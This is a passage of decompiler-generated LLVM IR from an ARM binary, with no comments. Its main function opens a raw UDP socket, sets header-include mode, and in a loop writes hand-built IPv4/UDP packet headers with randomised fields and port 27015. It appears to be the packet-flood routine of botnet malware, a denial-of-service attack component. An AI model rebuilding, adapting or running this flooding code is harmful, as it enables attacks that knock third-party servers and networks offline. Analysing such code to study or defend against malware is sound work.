  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca0, { 1, 0 }
  uselistorder i32 %v1_ac9c, { 0, 2, 1 }
  uselistorder i32 %v3_ac80, { 2, 1, 0 }
  uselistorder i32 %v0_ac5c, { 1, 0, 2 }
  uselistorder i32 %v1_ac4c, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %v0_ac48, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ac44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_ac00, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v5_abec, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v1_abb8, { 1, 0, 2 }
  uselistorder i32 %v5_ab98, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_ab3c, { 1, 0 }
  uselistorder i32 %v4_aacc, { 0, 3, 1, 2 }
  uselistorder i32 %v1_aab0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i8 47, { 1, 0 }
  uselistorder label %dec_label_pc_b198, { 1, 0 }
  uselistorder label %dec_label_pc_b184, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_b084, { 1, 0 }
  uselistorder label %dec_label_pc_afa8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af14.preheader, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread24, { 2, 1, 0 }
}

define i32 @function_b1c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b1c8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b1c8 = load i32, i32* @r4, align 4
  %v6_b1c8 = load i32, i32* @r5, align 4
  %v9_b1c8 = load i32, i32* @r6, align 4
  %v12_b1c8 = load i32, i32* @r7, align 4
  %v1_b1cc = urem i32 %arg1, 256
  store i32 %v1_b1cc, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_b1e0 = urem i32 %arg3, 256
  store i32 %v1_b1e0, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_b1e8 = call i32* @calloc(i32 %v1_b1cc, i32 4)
  %v4_b1e8 = ptrtoint i32* %v2_b1e8 to i32
  %v0_b1ec = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b1f8 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_b200 = inttoptr i32 %v0_b1ec to i32*
  %v6_b200 = call i32 @function_92dc(i32 %v0_b1f8, i32* %v5_b200, i32 2, i32 0)
  %v1_b20c = urem i32 %v6_b200, 256
  store i32 %v1_b20c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b218 = load i32, i32* @r4, align 4
  %v0_b21c = load i32, i32* @r5, align 4
  %v5_b220 = trunc i32 %v6_b200 to i8
  %v6_b224 = inttoptr i32 %v0_b21c to i32*
  %v7_b224 = call i32 @function_92dc(i32 %v0_b218, i32* %v6_b224, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_b228 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b224, i32* @r7, align 4
  %v0_b238 = load i32, i32* @r4, align 4
  %v4_b23c = inttoptr i32 %v0_b228 to i32*
  %v5_b23c = call i32 @function_92dc(i32 %v0_b238, i32* %v4_b23c, i32 4, i32 64)
  %v1_b244 = urem i32 %v5_b23c, 256
  store i32 %v1_b244, i32* %ip.global-to-local, align 4
  %v0_b248 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b254 = load i32, i32* @r4, align 4
  %v5_b258 = trunc i32 %v5_b23c to i8
  %v6_b25c = inttoptr i32 %v0_b248 to i32*
  %v7_b25c = call i32 @function_92dc(i32 %v0_b254, i32* %v6_b25c, i32 5, i32 0)
  %v1_b268 = urem i32 %v7_b25c, 256
  store i32 %v1_b268, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b274 = load i32, i32* @r4, align 4
  %v0_b278 = load i32, i32* @r5, align 4
  %v5_b280 = inttoptr i32 %v0_b278 to i32*
  %v6_b280 = call i32 @function_92dc(i32 %v0_b274, i32* %v5_b280, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b290 = load i32, i32* @r5, align 4
  store i32 %v6_b280, i32* @r6, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  %v4_b29c = inttoptr i32 %v0_b290 to i32*
  %v5_b29c = call i32 @function_92dc(i32 %v0_b298, i32* %v4_b29c, i32 7, i32 27015)
  store i32 %v5_b29c, i32* @r4, align 4
  %v1_b2a8 = call i32 @function_1134c(i32 20)
  %v3_b2b4 = call i32 @function_11268(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v3_b2b4, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_b2c8 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_b2cc = icmp eq i32 %v3_b2c8, -1
  store i1 %v2_b2cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b2c8, i32* %fp.global-to-local, align 4
  br i1 %v2_b2cc, label %dec_label_pc_b680, label %dec_label_pc_b2d8

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b1c8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b2e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b2e0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b2f4 = call i32 @setsockopt(i32 0, i32 3, i32 %v6_b2e0, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v2_b2f8 = icmp eq i32 %v6_b2f4, -1
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2f8, label %dec_label_pc_b678, label %dec_label_pc_b300

dec_label_pc_b300:                                ; preds = %dec_label_pc_b2d8
  %v0_b300 = load i32, i32* @r4, align 4
  %v3_b300 = mul i32 %v0_b300, 65536
  store i32 %v3_b300, i32* %lr.global-to-local, align 4
  %v0_b304 = load i32, i32* @r7, align 4
  %v0_b308 = load i32, i32* @r6, align 4
  %v3_b308 = mul i32 %v0_b308, 65536
  store i32 %v3_b308, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_b310 = urem i32 %v0_b304, 65536
  %v3_b314 = urem i32 %v0_b308, 65536
  store i32 %v3_b314, i32* %r2.global-to-local, align 4
  %v3_b318 = urem i32 %v0_b300, 65536
  store i32 %v3_b318, i32* %r3.global-to-local, align 4
  %v0_b31c = load i32, i32* %sb.global-to-local, align 4
  %v2_b31c = icmp eq i32 %v0_b31c, 0
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp51 = icmp slt i32 %v0_b31c, 1
  br i1 %tmp51, label %dec_label_pc_b4a0, label %dec_label_pc_b334

dec_label_pc_b334:                                ; preds = %dec_label_pc_b300
  %v1_b338 = urem i32 %v0_b300, 256
  %v1_b33c = urem i32 %v0_b308, 256
  %v1_b340 = urem i32 %v0_b304, 256
  %v3_b344 = mul nuw nsw i32 %v1_b33c, 256
  %v3_b348 = mul nuw nsw i32 %v1_b338, 256
  %tmp52 = udiv i32 %v0_b304, 256
  %v3_b34c = urem i32 %tmp52, 256
  %v4_b350 = mul nuw nsw i32 %v1_b340, 256
  %v5_b350 = or i32 %v4_b350, %v3_b34c
  store i32 %v5_b350, i32* %r7.global-to-local, align 4
  %tmp53 = udiv i32 %v0_b300, 256
  %v4_b354 = urem i32 %tmp53, 256
  %v5_b354 = or i32 %v4_b354, %v3_b348
  store i32 %v5_b354, i32* %r5.global-to-local, align 4
  %tmp54 = udiv i32 %v0_b308, 256
  %v4_b358 = urem i32 %tmp54, 256
  %v5_b358 = or i32 %v4_b358, %v3_b344
  store i32 %v5_b358, i32* %r6.global-to-local, align 4
  store i32 %v1_b33c, i32* %r2.global-to-local, align 4
  store i32 %v1_b338, i32* %r3.global-to-local, align 4
  %v2_b3d4 = icmp eq i32 %v1_b268, 0
  %v4_b3d8 = sext i8 %v5_b258 to i32
  %sext = mul i32 %v0_b304, 16777216
  %v4_b3f4 = sdiv i32 %sext, 16777216
  %sext7 = mul i32 %v0_b308, 16777216
  %v4_b450 = sdiv i32 %sext7, 16777216
  %sext8 = mul i32 %v0_b300, 16777216
  %v4_b470 = sdiv i32 %sext8, 16777216
  br label %dec_label_pc_b374

dec_label_pc_b374:                                ; preds = %bb58, %dec_label_pc_b334
  %v2_b37c = call i32* @calloc(i32 128, i32 1)
  %v4_b37c = ptrtoint i32* %v2_b37c to i32
  store i32 %v4_b1e8, i32* %r2.global-to-local, align 4
  %v3_b384 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b384, i32* %r3.global-to-local, align 4
  %v2_b388 = load i32, i32* @r4, align 4
  %v5_b388 = mul i32 %v2_b388, 4
  %v6_b388 = add i32 %v5_b388, %v4_b1e8
  %v7_b388 = inttoptr i32 %v6_b388 to i32*
  store i32 %v4_b37c, i32* %v7_b388, align 4
  %v0_b38c = load i32, i32* %r2.global-to-local, align 4
  %v1_b38c = load i32, i32* %r3.global-to-local, align 4
  %v4_b38c = mul i32 %v1_b38c, 4
  %v5_b38c = add i32 %v4_b38c, %v0_b38c
  %v6_b38c = inttoptr i32 %v5_b38c to i32*
  %v7_b38c = load i32, i32* %v6_b38c, align 4
  store i32 %v7_b38c, i32* %lr.global-to-local, align 4
  %v1_b390 = inttoptr i32 %v7_b38c to i8*
  %v2_b390 = load i8, i8* %v1_b390, align 1
  %tmp = urem i8 %v2_b390, 16
  %v1_b394 = zext i8 %tmp to i32
  %v1_b398 = or i32 %v1_b394, 64
  store i32 %v1_b398, i32* %r3.global-to-local, align 4
  %v1_b39c = trunc i32 %v1_b398 to i8
  store i8 %v1_b39c, i8* %v1_b390, align 1
  %v0_b3a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b3a0 = inttoptr i32 %v0_b3a0 to i8*
  %v2_b3a0 = load i8, i8* %v1_b3a0, align 1
  %v1_b3a4 = and i8 %v2_b3a0, -16
  %v1_b3a8 = or i8 %v1_b3a4, 5
  store i8 %v1_b3a8, i8* %v1_b3a0, align 1
  %v2_b3b4 = load i32, i32* %lr.global-to-local, align 4
  %v3_b3b4 = add i32 %v2_b3b4, 1
  %v4_b3b4 = inttoptr i32 %v3_b3b4 to i8*
  store i8 %v5_b220, i8* %v4_b3b4, align 1
  %v3_b3b8 = load i32, i32* %stack_var_-44, align 4
  %v1_b3bc = add i32 %v3_b3b8, 32
  %tmp55 = mul i32 %v1_b3bc, 256
  %v1_b3c8 = and i32 %tmp55, 65280
  %tmp56 = udiv i32 %v1_b3bc, 256
  %v4_b3cc = urem i32 %tmp56, 256
  %v5_b3cc = or i32 %v4_b3cc, %v1_b3c8
  store i32 %v5_b3cc, i32* %r2.global-to-local, align 4
  store i1 %v2_b3d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b3d8, i32* %r3.global-to-local, align 4
  %v2_b3dc = load i32, i32* %lr.global-to-local, align 4
  %v3_b3dc = add i32 %v2_b3dc, 8
  %v4_b3dc = inttoptr i32 %v3_b3dc to i8*
  store i8 %v5_b258, i8* %v4_b3dc, align 1
  %v0_b3e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3e0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_b374
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b3e4 = load i32, i32* %lr.global-to-local, align 4
  %v4_b3e4 = add i32 %v3_b3e4, 6
  %v5_b3e4 = inttoptr i32 %v4_b3e4 to i8*
  store i8 64, i8* %v5_b3e4, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b374, %bb
  %v0_b3e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3e8 = trunc i32 %v0_b3e8 to i8
  %v2_b3e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_b3e8 = add i32 %v2_b3e8, 2
  %v4_b3e8 = inttoptr i32 %v3_b3e8 to i8*
  store i8 %v1_b3e8, i8* %v4_b3e8, align 1
  %v0_b3ec = load i32, i32* %r2.global-to-local, align 4
  %v3_b3ec = sdiv i32 %v0_b3ec, 256
  store i32 %v3_b3ec, i32* %ip.global-to-local, align 4
  store i32 %v4_b3f4, i32* %r2.global-to-local, align 4
  %v2_b3f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_b3f8 = add i32 %v2_b3f8, 9
  %v4_b3f8 = inttoptr i32 %v3_b3f8 to i8*
  store i8 17, i8* %v4_b3f8, align 1
  store i32 ptrtoint (i32* @global_var_1a420.104 to i32), i32* %r3.global-to-local, align 4
  %v0_b400 = load i32, i32* %r2.global-to-local, align 4
  %v1_b400 = trunc i32 %v0_b400 to i8
  %v2_b400 = load i32, i32* %lr.global-to-local, align 4
  %v3_b400 = add i32 %v2_b400, 5
  %v4_b400 = inttoptr i32 %v3_b400 to i8*
  store i8 %v1_b400, i8* %v4_b400, align 1
  %v0_b404 = load i32, i32* %ip.global-to-local, align 4
  %v1_b404 = trunc i32 %v0_b404 to i8
  %v2_b404 = load i32, i32* %lr.global-to-local, align 4
  %v3_b404 = add i32 %v2_b404, 3
  %v4_b404 = inttoptr i32 %v3_b404 to i8*
  store i8 %v1_b404, i8* %v4_b404, align 1
  %v0_b408 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b408, label %.thread9, label %bb57

.thread9:                                         ; preds = %.thread
  %v3_b40c10 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b40c10, i32* %ip.global-to-local, align 4
  br label %bb58

bb57:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b40c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b40c, i32* %ip.global-to-local, align 4
  %v3_b410 = load i32, i32* %lr.global-to-local, align 4
  %v4_b410 = add i32 %v3_b410, 7
  %v5_b410 = inttoptr i32 %v4_b410 to i8*
  store i8 0, i8* %v5_b410, align 1
  %v0_b418.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %bb57
  %v0_b418 = phi i32 [ %v3_b40c10, %.thread9 ], [ %v0_b418.pre, %bb57 ]
  %v2_b414 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_b414, i32* %r2.global-to-local, align 4
  %v3_b418 = mul i32 %v0_b418, 32
  store i32 %v3_b418, i32* %r3.global-to-local, align 4
  %v1_b41c = load i32, i32* %lr.global-to-local, align 4
  %v2_b41c = add i32 %v1_b41c, 12
  %v3_b41c = inttoptr i32 %v2_b41c to i32*
  store i32 %v2_b414, i32* %v3_b41c, align 4
  %v0_b420 = load i32, i32* %r3.global-to-local, align 4
  %v1_b420 = load i32, i32* %ip.global-to-local, align 4
  %tmp61 = mul i32 %v1_b420, -8
  %v5_b420 = add i32 %v0_b420, %tmp61
  %v1_b424 = load i32, i32* @sl, align 4
  %v2_b424 = add i32 %v5_b420, %v1_b424
  store i32 %v2_b424, i32* %r3.global-to-local, align 4
  %v1_b428 = add i32 %v2_b424, 16
  %v2_b428 = inttoptr i32 %v1_b428 to i32*
  %v3_b428 = load i32, i32* %v2_b428, align 4
  %v1_b42c = load i32, i32* %lr.global-to-local, align 4
  %v2_b42c = add i32 %v1_b42c, 16
  %v3_b42c = inttoptr i32 %v2_b42c to i32*
  store i32 %v3_b428, i32* %v3_b42c, align 4
  %v3_b430 = load i32, i32* %stack_var_-44, align 4
  %v1_b434 = add i32 %v3_b430, 12
  %tmp59 = mul i32 %v1_b434, 256
  %v1_b444 = and i32 %tmp59, 65280
  %tmp60 = udiv i32 %v1_b434, 256
  %v4_b448 = urem i32 %tmp60, 256
  %v5_b448 = or i32 %v4_b448, %v1_b444
  store i32 %v5_b448, i32* %ip.global-to-local, align 4
  %v1_b44c = load i32, i32* %lr.global-to-local, align 4
  %v2_b44c = add i32 %v1_b44c, 28
  %v3_b44c = inttoptr i32 %v2_b44c to i32*
  store i32 -1, i32* %v3_b44c, align 4
  store i32 %v4_b450, i32* %r2.global-to-local, align 4
  %v0_b454 = load i32, i32* %lr.global-to-local, align 4
  %v1_b454 = add i32 %v0_b454, 20
  store i32 %v1_b454, i32* %r4.global-to-local, align 4
  %v0_b458 = load i32, i32* %ip.global-to-local, align 4
  %v3_b458 = sdiv i32 %v0_b458, 256
  store i32 %v3_b458, i32* %r3.global-to-local, align 4
  %v0_b45c = load i32, i32* %r7.global-to-local, align 4
  %v1_b45c = trunc i32 %v0_b45c to i8
  %v3_b45c = add i32 %v0_b454, 4
  %v4_b45c = inttoptr i32 %v3_b45c to i8*
  store i8 %v1_b45c, i8* %v4_b45c, align 1
  %v0_b460 = load i32, i32* %r6.global-to-local, align 4
  %v1_b460 = trunc i32 %v0_b460 to i8
  %v2_b460 = load i32, i32* %lr.global-to-local, align 4
  %v3_b460 = add i32 %v2_b460, 20
  %v4_b460 = inttoptr i32 %v3_b460 to i8*
  store i8 %v1_b460, i8* %v4_b460, align 1
  %v0_b464 = load i32, i32* %r3.global-to-local, align 4
  %v1_b464 = trunc i32 %v0_b464 to i8
  %v2_b464 = load i32, i32* %r4.global-to-local, align 4
  %v3_b464 = add i32 %v2_b464, 5
  %v4_b464 = inttoptr i32 %v3_b464 to i8*
  store i8 %v1_b464, i8* %v4_b464, align 1
  %v0_b468 = load i32, i32* %r5.global-to-local, align 4
  %v1_b468 = trunc i32 %v0_b468 to i8
  %v2_b468 = load i32, i32* %r4.global-to-local, align 4
  %v3_b468 = add i32 %v2_b468, 2
  %v4_b468 = inttoptr i32 %v3_b468 to i8*
  store i8 %v1_b468, i8* %v4_b468, align 1
  %v0_b46c = load i32, i32* %r2.global-to-local, align 4
  %v1_b46c = trunc i32 %v0_b46c to i8
  %v2_b46c = load i32, i32* %r4.global-to-local, align 4
  %v3_b46c = add i32 %v2_b46c, 1
  %v4_b46c = inttoptr i32 %v3_b46c to i8*
  store i8 %v1_b46c, i8* %v4_b46c, align 1
  store i32 %v4_b470, i32* %r3.global-to-local, align 4
  %v0_b474 = load i32, i32* %ip.global-to-local, align 4
  %v1_b474 = trunc i32 %v0_b474 to i8
  %v2_b474 = load i32, i32* %r4.global-to-local, align 4
  %v3_b474 = add i32 %v2_b474, 4
  %v4_b474 = inttoptr i32 %v3_b474 to i8*
  store i8 %v1_b474, i8* %v4_b474, align 1
  %v0_b478 = load i32, i32* %r3.global-to-local, align 4
  %v1_b478 = trunc i32 %v0_b478 to i8
  %v2_b478 = load i32, i32* %r4.global-to-local, align 4
  %v3_b478 = add i32 %v2_b478, 3
  %v4_b478 = inttoptr i32 %v3_b478 to i8*
  store i8 %v1_b478, i8* %v4_b478, align 1
  %v0_b47c = load i32, i32* %r8.global-to-local, align 4
  %v0_b480 = load i32, i32* %lr.global-to-local, align 4
  %v1_b480 = add i32 %v0_b480, 32
  %v3_b484 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b484, i32* %r2.global-to-local, align 4
  %v3_b488 = call i32 @function_11814(i32 %v1_b480, i32 %v0_b47c, i32 %v3_b484)
  %v3_b48c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b48c, i32* %r3.global-to-local, align 4
  %v1_b490 = add i32 %v3_b48c, 1
  store i32 %v1_b490, i32* @r4, align 4
  %v1_b494 = load i32, i32* %sb.global-to-local, align 4
  %v9_b494 = icmp eq i32 %v1_b490, %v1_b494
  store i1 %v9_b494, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b490, i32* %stack_var_-40, align 4
  %v5_b49c = icmp slt i32 %v1_b490, %v1_b494
  br i1 %v5_b49c, label %dec_label_pc_b374, label %dec_label_pc_b4a0

dec_label_pc_b4a0:                                ; preds = %bb58, %dec_label_pc_b300
  %v0_b4a0 = phi i32 [ %v0_b31c, %dec_label_pc_b300 ], [ %v1_b494, %bb58 ]
  %v2_b4a0 = icmp eq i32 %v0_b4a0, 0
  store i1 %v2_b4a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_b4e8 = icmp eq i32 %v3_b310, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  br label %dec_label_pc_b4a8.outer

dec_label_pc_b4a8.outer:                          ; preds = %dec_label_pc_b5b8, %dec_label_pc_b4a0
  %v1_b4a8.ph.in = phi i32 [ %v1_b5ac, %dec_label_pc_b5b8 ], [ %v0_b4a0, %dec_label_pc_b4a0 ]
  %v0_b4a8.ph = phi i1 [ %v2_b5b8, %dec_label_pc_b5b8 ], [ %v2_b4a0, %dec_label_pc_b4a0 ]
  %v1_b4a8.ph = icmp slt i32 %v1_b4a8.ph.in, 0
  %v4_b4a8 = or i1 %v1_b4a8.ph, %v0_b4a8.ph
  br label %dec_label_pc_b4a8

dec_label_pc_b4a8:                                ; preds = %dec_label_pc_b4a8.outer, %dec_label_pc_b4a8
  br i1 %v4_b4a8, label %dec_label_pc_b4a8, label %dec_label_pc_b4ac

dec_label_pc_b4ac:                                ; preds = %dec_label_pc_b4a8
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_b4b8

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b4ac
  %v1_b4cc = phi i32 [ %v1_b5a8, %dec_label_pc_b508 ], [ 0, %dec_label_pc_b4ac ]
  %v5_b4bc = mul i32 %v1_b4cc, 24
  %v1_b4c0 = load i32, i32* @sl, align 4
  %v2_b4c0 = add i32 %v1_b4c0, %v5_b4bc
  store i32 %v2_b4c0, i32* %r3.global-to-local, align 4
  %v1_b4c8 = add i32 %v2_b4c0, 20
  %v2_b4c8 = inttoptr i32 %v1_b4c8 to i8*
  %v3_b4c8 = load i8, i8* %v2_b4c8, align 1
  %v4_b4c8 = zext i8 %v3_b4c8 to i32
  store i32 %v4_b4c8, i32* %r2.global-to-local, align 4
  %v4_b4cc = mul i32 %v1_b4cc, 4
  %v5_b4cc = add i32 %v4_b4cc, %v4_b1e8
  %v6_b4cc = inttoptr i32 %v5_b4cc to i32*
  %v7_b4cc = load i32, i32* %v6_b4cc, align 4
  store i32 %v7_b4cc, i32* @r5, align 4
  %v7_b4d4 = icmp eq i8 %v3_b4c8, 31
  store i1 %v7_b4d4, i1* %cpsr_z.global-to-local, align 1
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r7.global-to-local, align 4
  %v1_b4dc = add i32 %v7_b4cc, 20
  store i32 %v1_b4dc, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_b4c8, 32
  br i1 %tmp62, label %dec_label_pc_b5c4, label %dec_label_pc_b4e4

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b4b8
  store i32 %v3_b310, i32* %r2.global-to-local, align 4
  store i1 %v9_b4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4e8, label %dec_label_pc_b62c, label %dec_label_pc_b4f0

dec_label_pc_b4f0:                                ; preds = %dec_label_pc_b5c4.dec_label_pc_b4f0_crit_edge, %dec_label_pc_b4e4
  %v1_b4f4 = phi i32 [ %v1_b4f4.pre, %dec_label_pc_b5c4.dec_label_pc_b4f0_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_b4e4 ]
  store i32 %v3_b314, i32* %r3.global-to-local, align 4
  %v9_b4f4 = icmp eq i32 %v3_b314, %v1_b4f4
  store i1 %v9_b4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4f4, label %dec_label_pc_b648, label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %dec_label_pc_b62c.dec_label_pc_b4fc_crit_edge, %dec_label_pc_b4f0
  %v1_b500 = phi i32 [ %v1_b500.pre, %dec_label_pc_b62c.dec_label_pc_b4fc_crit_edge ], [ %v1_b4f4, %dec_label_pc_b4f0 ]
  %v9_b500 = icmp eq i32 %v3_b318, %v1_b500
  store i1 %v9_b500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b500, label %dec_label_pc_b664, label %dec_label_pc_b508

dec_label_pc_b508:                                ; preds = %dec_label_pc_b648, %dec_label_pc_b4fc, %dec_label_pc_b664
  %v0_b50c = load i32, i32* %r8.global-to-local, align 4
  %v1_b50c = trunc i32 %v0_b50c to i8
  %v2_b50c = load i32, i32* @r5, align 4
  %v3_b50c = add i32 %v2_b50c, 10
  %v4_b50c = inttoptr i32 %v3_b50c to i8*
  store i8 %v1_b50c, i8* %v4_b50c, align 1
  %v0_b510 = load i32, i32* %r8.global-to-local, align 4
  %v1_b510 = trunc i32 %v0_b510 to i8
  %v2_b510 = load i32, i32* @r5, align 4
  %v3_b510 = add i32 %v2_b510, 11
  %v4_b510 = inttoptr i32 %v3_b510 to i8*
  store i8 %v1_b510, i8* %v4_b510, align 1
  %v0_b514 = load i32, i32* @r5, align 4
  store i32 %v0_b514, i32* @r0, align 4
  %v2_b518 = call i32 @function_ddf4(i32 %v0_b514, i32 20)
  %v3_b518 = trunc i32 %v2_b518 to i8
  %v4_b51c = sdiv i32 %v2_b518, 256
  store i32 %v4_b51c, i32* %r3.global-to-local, align 4
  %v1_b520 = trunc i32 %v4_b51c to i8
  %v2_b520 = load i32, i32* @r5, align 4
  %v3_b520 = add i32 %v2_b520, 11
  %v4_b520 = inttoptr i32 %v3_b520 to i8*
  store i8 %v1_b520, i8* %v4_b520, align 1
  %v3_b524 = load i32, i32* @r5, align 4
  %v4_b524 = add i32 %v3_b524, 10
  %v5_b524 = inttoptr i32 %v4_b524 to i8*
  store i8 %v3_b518, i8* %v5_b524, align 1
  %v0_b528 = load i32, i32* %r8.global-to-local, align 4
  %v1_b528 = trunc i32 %v0_b528 to i8
  %v2_b528 = load i32, i32* @r6, align 4
  %v3_b528 = add i32 %v2_b528, 6
  %v4_b528 = inttoptr i32 %v3_b528 to i8*
  store i8 %v1_b528, i8* %v4_b528, align 1
  %v0_b52c = load i32, i32* %r8.global-to-local, align 4
  %v1_b52c = trunc i32 %v0_b52c to i8
  %v2_b52c = load i32, i32* @r6, align 4
  %v3_b52c = add i32 %v2_b52c, 7
  %v4_b52c = inttoptr i32 %v3_b52c to i8*
  store i8 %v1_b52c, i8* %v4_b52c, align 1
  %v0_b530 = load i32, i32* @r5, align 4
  %v1_b530 = add i32 %v0_b530, 24
